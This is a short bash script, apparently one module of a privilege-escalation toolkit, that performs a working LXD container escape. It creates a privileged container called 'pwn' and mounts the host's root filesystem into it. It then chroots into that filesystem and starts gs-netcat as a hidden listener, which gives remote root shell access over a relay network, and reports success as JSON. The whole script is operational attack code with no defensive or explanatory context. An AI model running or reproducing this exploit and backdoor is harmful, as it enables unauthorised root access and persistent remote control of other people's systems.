#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="lxd"
info "Checking LXD/LXC..."
id|grep -qE "lxd|lxc" || { result_json "$METHOD" "skip" "Not in lxd group"; exit 1; }
command -v lxc &>/dev/null || { result_json "$METHOD" "skip" "lxc not installed"; exit 1; }
secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
lxc init ubuntu:18.04 pwn -c security.privileged=true 2>/dev/null
lxc config device add pwn host-root disk source=/ path=/mnt/root recursive=true 2>/dev/null
lxc start pwn && lxc exec pwn -- /bin/sh -c "chroot /mnt/root bash -c 'nohup gs-netcat -s $secret -l -i &'" 2>/dev/null && {
    result_json "$METHOD" "success" "LXD escape" "$secret"; exit 0
}
result_json "$METHOD" "fail" "LXD exploit failed"; exit 1
